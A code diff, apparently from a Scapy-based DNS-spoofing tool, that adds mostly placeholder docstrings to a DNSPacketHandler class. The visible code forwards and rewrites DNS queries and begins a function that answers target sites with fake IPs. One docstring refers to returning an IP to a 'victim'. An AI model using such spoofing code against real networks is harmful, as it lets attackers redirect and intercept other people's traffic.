@@ -568,6 +568,14 @@ class DNSPacketHandler(object):
         
     
     def forward_dns(self, dns_packet):
+        """_summary_
+
+        Args:
+            dns_packet (_type_): _description_
+
+        Returns:
+            _type_: _description_
+        """
         print("Forwarding: {}".format(dns_packet[DNSQR].qname))
         response = sr1(IP(dst='8.8.8.8')/
                     UDP(sport=dns_packet[UDP].sport)/
@@ -579,6 +587,16 @@ class DNSPacketHandler(object):
         return "Responding to {}".format(dns_packet[IP].src)
     
     def forward_modified_dns(self, dns_packet, new_qname_decoded):
+        """_summary_
+        >>> self.forward_modified_dns(packet, "www.youtube.com") # will send DNS request for youtube and return IP to victim
+
+        Args:
+            dns_packet (Scapy packet): _description_
+            new_qname_decoded (str): _description_
+
+        Returns:
+            _type_: _description_
+        """
         new_qname=new_qname_decoded.encode()
         print("Modifying {} to {}".format(dns_packet[DNSQR].qname, new_qname))
         # note that in the DNS layer of the result below the query name has been changed to a new one
@@ -595,11 +613,17 @@ class DNSPacketHandler(object):
         """Forwarding of arbitrary packets
 
         Args:
-            packet (_type_): _description_
+            packet (Scapy packet): _description_
         """
         sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)
 
     def send_response(self, packet, target_sites_map):
+        """_summary_
+
+        Args:
+            packet (_type_): _description_
+            target_sites_map (_type_): _description_
+        """
         target_sites= list(target_sites_map.keys())
         fake_ips    = list(target_sites_map.values())
         
